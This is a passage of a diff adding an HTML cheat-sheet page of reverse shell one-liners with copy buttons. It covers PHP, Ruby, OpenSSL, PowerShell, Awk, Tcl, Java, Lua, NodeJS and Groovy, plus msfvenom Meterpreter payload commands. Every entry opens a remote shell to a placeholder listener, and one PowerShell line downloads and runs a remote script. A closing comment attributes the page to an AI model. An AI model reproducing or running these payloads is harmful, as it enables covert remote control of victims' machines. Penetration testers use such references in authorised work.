[(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)())), globals(), __import__('contextlib'))"</pre>
+      <button onclick="copy('python05');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- PHP -->
+    <div class="card">
+      <h3><i class="fab fa-php"></i> PHP</h3>
+      <pre id="php01">php -r '$sock=fsockopen("127.0.0.1",8080);exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
+      <button onclick="copy('php01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="php02">php -r '$s=fsockopen("127.0.0.1",8080);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'</pre>
+      <button onclick="copy('php02');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="php03">php -r '$s=fsockopen("127.0.0.1",8080);shell_exec("/bin/sh -i <&3 >&3 2>&3");'</pre>
+      <button onclick="copy('php03');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="php04">php -r '$s=fsockopen("127.0.0.1",8080);`/bin/sh -i <&3 >&3 2>&3`;'</pre>
+      <button onclick="copy('php04');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="php05">php -r '$s=fsockopen("127.0.0.1",8080);system("/bin/sh -i <&3 >&3 2>&3");'</pre>
+      <button onclick="copy('php05');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="php06">php -r '$s=fsockopen("127.0.0.1",8080);popen("/bin/sh -i <&3 >&3 2>&3", "r");'</pre>
+      <button onclick="copy('php06');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Ruby -->
+    <div class="card">
+      <h3><i class="fas fa-gem"></i> Ruby</h3>
+      <pre id="ruby01">ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</pre>
+      <button onclick="copy('ruby01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="ruby02">ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>
+      <button onclick="copy('ruby02');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <span class="section-label">Windows only</span>
+      <pre id="ruby03">ruby -rsocket -e 'c=TCPSocket.new("127.0.0.1","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>
+      <button onclick="copy('ruby03');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- OpenSSL -->
+    <div class="card">
+      <h3><i class="fas fa-lock"></i> OpenSSL</h3>
+      <span class="section-label">Attacker</span>
+      <pre id="ssl01">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</pre>
+      <button onclick="copy('ssl01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="ssl02">openssl s_server -quiet -key key.pem -cert cert.pem -port 8080</pre>
+      <button onclick="copy('ssl02');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <span class="section-label">or</span>
+      <pre id="ssl03">ncat --ssl -vv -l -p 8080</pre>
+      <button onclick="copy('ssl03');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <span class="section-label">Victim</span>
+      <pre id="ssl04">mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:8080 > /tmp/s; rm /tmp/s</pre>
+      <button onclick="copy('ssl04');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Powershell -->
+    <div class="card">
+      <h3><i class="fab fa-microsoft"></i> Powershell</h3>
+      <pre id="ps01">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("127.0.0.1",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
+      <button onclick="copy('ps01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="ps02">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
+      <button onclick="copy('ps02');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="ps03">powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')</pre>
+      <button onclick="copy('ps03');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Awk -->
+    <div class="card">
+      <h3><i class="fas fa-terminal"></i> Awk</h3>
+      <pre id="awk01">awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/8080"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null</pre>
+      <button onclick="copy('awk01');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- TCLsh -->
+    <div class="card">
+      <h3><i class="fas fa-terminal"></i> TCLsh</h3>
+      <pre id="tcl01">echo 'set s [socket 127.0.0.1 8080];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh</pre>
+      <button onclick="copy('tcl01');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Java -->
+    <div class="card">
+      <h3><i class="fab fa-java"></i> Java</h3>
+      <pre id="java01">r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/8080;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()</pre>
+      <button onclick="copy('java01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="java02">String host="127.0.0.1";
+int port=4444;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
+      <button onclick="copy('java02');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="java03">Thread thread = new Thread(){
+    public void run(){
+        // Reverse shell here
+    }
+}
+thread.start();</pre>
+      <button onclick="copy('java03');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- War -->
+    <div class="card">
+      <h3><i class="fas fa-file-archive"></i> War</h3>
+      <pre id="war01">msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f war > reverse.war
+strings reverse.war | grep jsp # in order to get the name of the file</pre>
+      <button onclick="copy('war01');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Lua -->
+    <div class="card">
+      <h3><i class="fas fa-code"></i> Lua</h3>
+      <span class="section-label">Linux only</span>
+      <pre id="lua01">lua -e "require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','8080');os.execute('/bin/sh -i <&3 >&3 2>&3');"</pre>
+      <button onclick="copy('lua01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <span class="section-label">Windows and Linux</span>
+      <pre id="lua02">lua5.1 -e 'local host, port = "127.0.0.1", 8080 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</pre>
+      <button onclick="copy('lua02');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- NodeJS -->
+    <div class="card">
+      <h3><i class="fab fa-node-js"></i> NodeJS</h3>
+      <pre id="ndjs01">(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8080, "127.0.0.1", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();</pre>
+      <button onclick="copy('ndjs01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="ndjs02">require('child_process').exec('nc -e /bin/sh 127.0.0.1 8080')</pre>
+      <button onclick="copy('ndjs02');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="ndjs03">-var x = global.process.mainModule.require
+-x('child_process').exec('nc 127.0.0.1 8080 -e /bin/bash')</pre>
+      <button onclick="copy('ndjs03');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="ndjs04">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</pre>
+      <button onclick="copy('ndjs04');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Groovy -->
+    <div class="card">
+      <h3><i class="fas fa-code"></i> Groovy</h3>
+      <pre id="groovy01">String host="127.0.0.1";
+int port=8080;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
+      <button onclick="copy('groovy01');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Meterpreter Shell -->
+    <div class="card">
+      <h3><i class="fas fa-shield-alt"></i> Meterpreter Shell</h3>
+      <pre id="msf01">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f exe > reverse.exe</pre>
+      <button onclick="copy('msf01');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="msf02">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f exe > reverse.exe</pre>
+      <button onclick="copy('msf02');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="msf03">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f elf >reverse.elf</pre>
+      <button onclick="copy('msf03');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="msf04">msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 -f elf >reverse.elf</pre>
+      <button onclick="copy('msf04');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="msf05">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f elf > shell.elf</pre>
+      <button onclick="copy('msf05');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="msf06">msfvenom -p windows/meterpreter/reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f exe > shell.exe</pre>
+      <button onclick="copy('msf06');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="msf07">msfvenom -p osx/x86/shell_reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f macho > shell.macho</pre>
+      <button onclick="copy('msf07');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="msf08">msfvenom -p windows/meterpreter/reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f asp > shell.asp</pre>
+      <button onclick="copy('msf08');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="msf09">msfvenom -p java/jsp_shell_reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f raw > shell.jsp</pre>
+      <button onclick="copy('msf09');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="msf10">msfvenom -p java/jsp_shell_reverse_tcp LHOST="127.0.0.1" LPORT=8080 -f war > shell.war</pre>
+      <button onclick="copy('msf10');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="msf11">msfvenom -p cmd/unix/reverse_python LHOST="127.0.0.1" LPORT=8080 -f raw > shell.py</pre>
+      <button onclick="copy('msf11');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="msf12">msfvenom -p cmd/unix/reverse_bash LHOST="127.0.0.1" LPORT=8080 -f raw > shell.sh</pre>
+      <button onclick="copy('msf12');"><i class="fas fa-copy"></i> Copy</button>
+      
+      <pre id="msf13">msfvenom -p cmd/unix/reverse_perl LHOST="127.0.0.1" LPORT=8080 -f raw > shell.pl</pre>
+      <button onclick="copy('msf13');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+    
+    <!-- Xterm -->
+    <div class="card">
+      <h3><i class="fas fa-window-maximize"></i> Xterm</h3>
+      <pre id="xterm001">xterm -display 127.0.0.1:1
+Xnest :1
+xhost +targetip</pre>
+      <button onclick="copy('xterm001');"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+  </div>
+
+  <script>
+    // Add a subtle animation to cards on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      const cards = document.querySelectorAll('.card');
+      cards.forEach((card, index) => {
+        setTimeout(() => {
+          card.style.opacity = '1';
+          card.style.transform = 'translateY(0)';
+        }, 100 * index);
+      });
+    });
+  </script>
+</body>
+<!-- From deepseek -->
+</html>
